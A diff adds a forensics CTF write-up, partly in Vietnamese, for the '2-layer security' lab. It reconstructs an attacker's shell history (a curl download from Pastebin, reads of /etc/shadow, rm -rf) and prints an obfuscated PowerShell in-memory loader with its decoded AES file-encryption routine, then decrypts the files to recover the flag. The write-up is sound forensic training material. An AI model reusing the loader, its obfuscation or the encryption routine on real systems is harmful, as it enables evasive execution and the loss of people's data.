@@ -4511,3 +4511,194 @@ print(decrypted_text)
 
 #### c) Kết quả:
 `flag{M4st3rW4yn3_WhoIsTheTru3M4st3rm1nd_R1ddl3M3Th4t}`
+
+### 3. 2-layer security:
+#### a) Đề bài:
+- Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS/tree/main/2-layer%20security
+- Đề bài:
+![image](https://hackmd.io/_uploads/Hkuu9kjOfg.png)
+- Handout: https://mega.nz/file/07FSFYpC#01CuXdiE0Hr7M7dNclmBWSYXKQWRqNhNuBQmkpRTvw8
+
+#### b) Phân tích cách làm:
+- Using FTK Imager, in `home/kalilinux/.zhs_history`:
+    ``` linux
+    cd ~
+    cd Desktop
+    ls
+    clear
+    cd ../../../../../../../../
+    cd /var/log
+    cd ~
+    sudo apt install curl
+    curl https://pastebin.com/raw/awhuFZse -0 tienbip.txt
+    LESSCLOSE=/usr/bin/lesspipe %s %s
+    cd -
+    cd Desktop
+    ls
+    gpg --quick-gen-key Cocainit
+    gpg --quick-gen-key VNvodich
+    gpg --quick-gen-key Siuuuuuu
+    ls
+    gpg -er VNvodich RestrictedAccess.pdf
+    ls
+    rm -rf RestrictedAccess.pdf
+    cat /etc/shadow | grep idek{
+    cat /etc/shadow | grep "idek{"
+    mv RestrictedAccess.pdf.gpg $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
+    pwsh
+    ls
+    mv T3C4U.SOS recycle.bin
+    reboot
+    ```
+    Acorrding to the above content, attacker download data from `https://pastebin.com/raw/awhuFZse` and save it in `tienbip.txt`. Then, three key pairs were generated with three names (`Cocainit`, `VNvodich`, and `Siuuuuuu`) by GnuP. After that, `RestrictedAccess.pdf` was encrypted by puclic key `VNvodich`, thereby `RestrictedAccess.pdf.gpg` was created. Then, the orginal file - `RestrictedAccess.pdf` - was immediately removed, and `RestrictedAccess.pdf.gpg` was renamed a string including five random characters. In the end, `T3C4U.SOS`, having five chars in its name, was renamed to disguised as `recycle.bin`.
+- Try checking for `https://pastebin.com/raw/awhuFZse`:
+![image](https://hackmd.io/_uploads/HJnb8I3_Mx.png)
+We get `https://tinyurl.com/2ksqnjs6`, access to this link, but there is nothing here.
+- In `home/kalilinux/Desktop`, I found a file named `recycle.bin`, maybe it is `T3C4U.SOS`:
+![image](https://hackmd.io/_uploads/Bkhfl8hOGl.png)
+- In `home/kalilinux/.gnupg`, I saw these files, it contains RSA keys: 
+![image](https://hackmd.io/_uploads/Sk4lK82dzg.png)
+Then set up GPG environment:
+![image](https://hackmd.io/_uploads/H1HwY8hOzl.png)
+We actually found `Cocainit`, `VNvodich`, and `Siuuuuuu`.
+- In `home/kalilinux/.local/share/powershell/PSReadLine/ConsoleHost_history.txt`:
+![image](https://hackmd.io/_uploads/rk2ox9Tuzx.png)
+    ``` powershell
+    ls
+    whoami
+    ( nEw-oBJECT syStem.io.sTrEamReadeR( ( nEw-oBJECT sysTeM.iO.COMPReSsioN.deflAtEsTREaM([sySTEM.iO.MeMoRyStreaM] [ConVert]::froMbaSe64striNg('hVXbbuJIEH2PlH/omZfYGrAwtxCkPASWXLTDgGL2Mot46MENeGLaqN3WLov873uqbQPGiRZhulz3OlXVBKM/mWVZnw/tRnpw79JDs5Me2l3QOF0XNJ4mydqge+mh1cJ5i5Me6DQhAkVakLjQwLcNAXy1yB9em2QLaYto2HVIk94Rpw0dF2eLYkDWBN2ENxeOwepQCumBEqI3eqALWQvcDs42niY9FA+vYN+mn+srdsPyT3p9dX1VvHyfjoVcqv1OR4rd0ysX8ZjLm9oNXwsfrG/i7/rkx0+x1Mzbx1psHU8sExXovTM0dmvFd1BnJeNDKUS84WCTQ+eXIN5FsbBsKEBPGaKSjPAHey3iLKNjgs5McRmvIrV9DCQPYZ7rlVxkOVSCXXxOnGDFLJhNud7Y7CxvSm8QRss3ku5CHkgTq8YaNVbiOF+FXMP4ohCYn0ID9JTK5bsNcAt2G6HGkS8W/f5wMLw2lThT7vuBXKPo+cdIwzzXy+3/gnEVsxMIEG+zHCyQ/f6r4P5DGBpdquwxCIXzmIThN74VF0BBHCWakMm8lnTZF/ZTThxv4uG4vqJyR5M3+/+xptlScKCF8oQ2ru7JlSmSQoC2FyejuacV6l3kTcoEdjHFA7EOJHtv3gze+BnjKecExvsAQ2AVoeeTRO8S4sCXzzF/+wwFrRJRY1Oa+VOrXiYOpb6gVpYRUEInSlKBpMCOE850VAAMI/+jGaY2mzgEcME0c+kF/wowtVk+9gfqEPWRUljk+ljEMRSPQWWk2SpKpP/J9OqyQT+U4G9ldlqZhNPAU8AsaJEttVRvSr7T4+AXnRpJn8zMOGWJPix1EEnmIUWpw/0wkjqQyQV+NDOfKoOKjsMXtuGhgCrL6LIf/b4B5oHQIz7Os+HPp7tWvXqOYwyDZqebA3/GfO/GyOAwiN+zJygVK+s9UwLNnlkToSJzY4FcJTKDYJQFJzJ3OB9u/VDoQSBp2aF7thDTYn/APi3mVx5rU+ws2GbD6R679N7FeL4WZ2KwZ/udsOZxtnbFPkxpl8oL88G/BNWo6y+Am9VNt7/ThDsvv+PKOAGdG8OT4FrkAETHjK2nwsepT3apRsE+Ku9XsaflQF5o3dkcmjJUtMR2XNwYZeNsz8/+tYbRdpdo8czjjVVM2Ez8ox2kHVF/MGe/zR57DpLOhgtX4eVM3di2o8Q05EthWfPlM39ddO++ZMRtQbiNW7s292avL/JpkbFadxU7t9Et9N3G0UXFsF0x7BVxekezaryuzez/AA==' ), [SyStem.IO.comPreSSION.cOmpreSSIONModE]::DEcOmPREsS ) ), [text.ENcodiNg]::AScII)).ReAdToend()|&( $sHeLLid[1]+$shELliD[13]+'x')
+    Encryption -Path ./T3C4U
+    Remove-Item -Path ./T3C4U -Force -Recurse
+    exit
+    ```
+    This script was designed to decode, decompress, and execute a hidden secondary payload entirely in memory without writing it to disk.
+    - `[ConVert]::froMbaSe64striNg(...)`: Decodes a hardcoded Base64 string into a raw byte array.
+    - `[sysTeM.iO.COMPReSsioN.deflAtEsTREaM(..., DEcOmPREsS)`: Passes the raw bytes through a memory stream and decompresses them using the Deflate algorithm.
+    - `[text.ENcodiNg]::AScII).ReAdToend()`: Converts the decompressed data into plain ASCII text, revealing the hidden secondary script.
+    - `|&( $sHeLLid[1]+$shELliD[13]+'x')`: A classic obfuscation trick used to bypass signature detection. It dynamically constructs the `iex` (Invoke-Expression) command. The automatic variable `$ShellId` in PowerShell evaluates to `Microsoft.PowerShell`. Indexing into it `($ShellId[1]` is `i`, `$ShellId[13]` is `e`, appended with `'x'`) builds the execution string dynamically to evade basic static analysis and string-matching filters.
+    - `Encryption -Path ./T3C4U`: Calls a command or custom function named `Encryption` targeting a local file path (`./T3C4U`), likely encrypting data for exfiltration or as part of a destructive routine.
+    - `Remove-Item -Path ./T3C4U -Force -Recurse`: Forcefully and recursively deletes the `./T3C4U` file, acting as an anti-forensic measure to wipe temporary files or local artifacts.
+- In PowerShell, run the command below:
+    ``` powershell
+    ( nEw-oBJECT syStem.io.sTrEamReadeR( ( nEw-oBJECT sysTeM.iO.COMPReSsioN.deflAtEsTREaM([sySTEM.iO.MeMoRyStreaM] [ConVert]::froMbaSe64striNg('hVXbbuJIEH2PlH/omZfYGrAwtxCkPASWXLTDgGL2Mot46MENeGLaqN3WLov873uqbQPGiRZhulz3OlXVBKM/mWVZnw/tRnpw79JDs5Me2l3QOF0XNJ4mydqge+mh1cJ5i5Me6DQhAkVakLjQwLcNAXy1yB9em2QLaYto2HVIk94Rpw0dF2eLYkDWBN2ENxeOwepQCumBEqI3eqALWQvcDs42niY9FA+vYN+mn+srdsPyT3p9dX1VvHyfjoVcqv1OR4rd0ysX8ZjLm9oNXwsfrG/i7/rkx0+x1Mzbx1psHU8sExXovTM0dmvFd1BnJeNDKUS84WCTQ+eXIN5FsbBsKEBPGaKSjPAHey3iLKNjgs5McRmvIrV9DCQPYZ7rlVxkOVSCXXxOnGDFLJhNud7Y7CxvSm8QRss3ku5CHkgTq8YaNVbiOF+FXMP4ohCYn0ID9JTK5bsNcAt2G6HGkS8W/f5wMLw2lThT7vuBXKPo+cdIwzzXy+3/gnEVsxMIEG+zHCyQ/f6r4P5DGBpdquwxCIXzmIThN74VF0BBHCWakMm8lnTZF/ZTThxv4uG4vqJyR5M3+/+xptlScKCF8oQ2ru7JlSmSQoC2FyejuacV6l3kTcoEdjHFA7EOJHtv3gze+BnjKecExvsAQ2AVoeeTRO8S4sCXzzF/+wwFrRJRY1Oa+VOrXiYOpb6gVpYRUEInSlKBpMCOE850VAAMI/+jGaY2mzgEcME0c+kF/wowtVk+9gfqEPWRUljk+ljEMRSPQWWk2SpKpP/J9OqyQT+U4G9ldlqZhNPAU8AsaJEttVRvSr7T4+AXnRpJn8zMOGWJPix1EEnmIUWpw/0wkjqQyQV+NDOfKoOKjsMXtuGhgCrL6LIf/b4B5oHQIz7Os+HPp7tWvXqOYwyDZqebA3/GfO/GyOAwiN+zJygVK+s9UwLNnlkToSJzY4FcJTKDYJQFJzJ3OB9u/VDoQSBp2aF7thDTYn/APi3mVx5rU+ws2GbD6R679N7FeL4WZ2KwZ/udsOZxtnbFPkxpl8oL88G/BNWo6y+Am9VNt7/ThDsvv+PKOAGdG8OT4FrkAETHjK2nwsepT3apRsE+Ku9XsaflQF5o3dkcmjJUtMR2XNwYZeNsz8/+tYbRdpdo8czjjVVM2Ez8ox2kHVF/MGe/zR57DpLOhgtX4eVM3di2o8Q05EthWfPlM39ddO++ZMRtQbiNW7s292avL/JpkbFadxU7t9Et9N3G0UXFsF0x7BVxekezaryuzez/AA==' ), [SyStem.IO.comPreSSION.cOmpreSSIONModE]::DEcOmPREsS ) ), [text.ENcodiNg]::AScII)).ReAdToend()
+    ```
+    The output that we get:
+    ``` powershell
+    iEX ((("{40}{19}{25}{46}{15}{11}{41}{20}{14}{48}{33}{47}{37}{35}{2}{1}{31}{23}{18}{8}{45}{9}{39}{28}{24}{43}{38}{27}{53}{13}{36}{49}{16}{30}{17}{26}{21}{12}{0}{51}{4}{6}{10}{50}{5}{32}{34}{52}{42}{22}{29}{3}{44}{7}"-f '        }
+
+            YPMencryptor = YPMaesMan','aged = New-Object System.Security.Cryptograp','  YPMaesMan','{
+            YPMshaManaged.Dispose()
+     ','r()
+            YPMencryptedBytes = YPMencryptor.TransformFinal','edBytes
+            YPMaesManaged.Dispose()
+
+            if (YPMPath) {
+             ','Block(YPMplainBytes, 0, YPMplainBytes.Length)
+            YPMen','se()
+        }
+    ','ed.Padding = [System.Security.Cryptography.PaddingMode]::Z','cryptedBytes = YPMaesManaged','m
+        (','::ReadAllBytes(YPMFile.FullName)
+                YPMoutPath = YPMFile.FullName + jnO.SOSjnO
+    ','sEOk))
+
+            if (Y','arameterSetName = jnOCryptFilejnO)]
+            [String]YPMPath
+        )
+
+        Begin {
+            YPMshaMan','ra','M','
+                 ','ystem.Security.Cryptog','()]
+        [Outpu','(Mandatory = YPMtrue, P',' = [System.IO.File]','e
+                return jnOFile encrypted to YPMoutP','d
+            YPMaesManaged.Mode = [S','sManaged.BlockSize','t','   Write-Error -Message jnOFile not found!jnO
+                    break
+                }
+                YPMplainBytes',' ','      YPMae','athjnO
+            }
+        }
+
+
+        End ','Path -ErrorAction SilentlyContinue
+    ','hy.AesManage','   [System.IO.File]::WriteA','stem.','llBytes(YPMoutPath, YPMencryptedBytes)
+          ','256Managed
+          ','PMPath) {
+                YPMFile = G','ography.SHA','28
+    ','eros
+      ','function Encryption {
+        [CmdletBinding','
+            [Parameter','= YPMFile.LastWriteTim',' = 1','       YPMaesManaged.Dispo','
+            YPMaesManag','Type([string])]
+        Pa','Security.Crypt','aged = New-Object Sy','et-Item -Path YP','.IV + YPMencrypt','aged.CreateEncrypto','      (Get-Item YPMoutPath).LastWriteTime ','       YPMaesManaged.KeySize = 256
+        }
+
+        Process {
+            YPMaesManaged.Key = YPMshaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes(EOkYPMencryptedByte')).rePlace(([cHaR]69+[cHaR]79+[cHaR]107),[STRInG][cHaR]39).rePlace(([cHaR]106+[cHaR]110+[cHaR]79),[STRInG][cHaR]34).rePlace(([cHaR]89+[cHaR]80+[cHaR]77),[STRInG][cHaR]36) )
+    ```
+    The above code uses String Formatting technique to shuffe code fragments, combining with `.rePlace()` to hide sensitive characters (`EOk` $\rightarrow$ `'`, `jnO` $\rightarrow$ `"`, `YPM` $\rightarrow$ `$`). The similar visible script:
+    ``` powershell
+    function Encryption {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+    
+        $aesManaged.KeySize = 256
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes('$encryptedBytes'))
+    
+        $aesManaged.BlockSize = 128
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    
+        $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+        $encryptor = $aesManaged.CreateEncryptor()
+        $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+    
+        $encryptedBytes = $aesManaged.IV + $encryptedBytes
+        $outPath = $File.FullName + ".SOS"
+        [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+    }
+    ```
+    To decrypt `recycle.bin` according to the above script:
+    ``` py
+    import hashlib
+    from Crypto.Cipher import AES
+
+    def decrypt_file(input_path, output_path):
+        key_string = b'$encryptedBytes'
+        key = hashlib.sha256(key_string).digest()
+
+        try:
+            with open(r"C:\Users\Ha Nguyen\Desktop\CTF\2-layer security\home\kalilinux\Desktop\recycle.bin", 'rb') as f: cipher_bytes = f.read()
+
+            if len(cipher_bytes) < 16: return
+        
+            iv = cipher_bytes[:16]
+            ciphertext = cipher_bytes[16:]
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            plaintext_padded = cipher.decrypt(ciphertext)
+            plaintext = plaintext_padded.rstrip(b'\x00')
+
+            with open(output_path, 'wb') as f: f.write(plaintext)
+            print(output_path)
+
+        except Exception as e: print(e)
+
+    if __name__ == "__main__":
+        INPUT_FILE = "recycle.bin"
+        OUTPUT_FILE = "T3C4U"
+        decrypt_file(INPUT_FILE, OUTPUT_FILE)
+    ```
+    We get this file:
+    ![image](https://hackmd.io/_uploads/rJYQ2qTuMx.png)
+    ![image](https://hackmd.io/_uploads/BJec-o6dMx.png)
+    Decrypt `T3C4U` by using GPG:
+    ![image](https://hackmd.io/_uploads/rk-IMj6ufl.png)
+    We get a `.pdf` file:
+    ![image](https://hackmd.io/_uploads/SJpYMiTuMe.png)
+    ![image](https://hackmd.io/_uploads/BkOjzopOfx.png)
+
+#### c) Kết quả:
+`idek{Cr34t1n9_ch4ll3ngEs_6_d4ys_6_n1gts_w1th0ut_sl33p}`
+
+#### d) Attack Kill Chain:
+- **Staging & Setup:** Attacker downloaded `tienbip.txt` from Pastebin through `curl`, then set up an encryption environment by creating fake GPG key pairs (`Cocainit`, `VNvodich`, and `Siuuuuuu`).
+- **The first encryption class - Asymmetric Cryptography:** Using public key GPG to encrypt sensitive document (`RestrictedAccess.pdf`) to `T3C4U`, then definitely deleting the orginal file (`rm -rf`) to prevent file recovering (but he forgot to delete `.zsh_history` and `ConsoleHost_history.txt`).
+- **The second encryption class - Symmetric Cryptography:** Attacker used PowerShell to encrypt `T3C4U` by through AES. This script was entirely executed on memory (fileless execution) through Base64 and Deflate (lossless compression) to evade anti-virus softwares.
+- **Defense Evasion**: The last encrypted file was renamed `recycle.bin` to be disguised as recycle bin of system.
